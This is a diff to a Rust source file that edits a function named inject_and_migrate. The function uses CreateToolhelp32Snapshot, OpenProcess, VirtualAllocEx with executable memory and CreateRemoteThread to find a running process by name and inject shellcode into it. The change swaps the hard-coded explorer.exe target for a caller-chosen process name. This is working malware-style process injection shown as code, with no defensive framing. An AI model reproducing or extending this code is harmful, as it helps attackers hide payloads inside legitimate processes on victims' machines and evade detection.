@@ -6,7 +6,7 @@ use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, PR
 use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx};
 use windows::Win32::System::Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS};
 
-pub fn inject_and_migrate(shellcode: &[u8]) {
+pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
     // Call CreateToolhelp32Snapshot to get a snapshot of all the processes currently running
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/ToolHelp/fn.CreateToolhelp32Snapshot.html
@@ -30,13 +30,13 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
             }
             process_name.push(element_as_u8 as char);
         }
-        if process_name.contains("explorer.exe") {
+        if process_name.contains(target_process) {
             pid = process_entry.th32ProcessID;
             break;
         }
     }
     if pid == 0 {
-        panic!("Could not find an explorer.exe process");
+        panic!("Could not find a {target_process} process");
     }
 
     // Call OpenProcess to get a handle to the target process via its PID
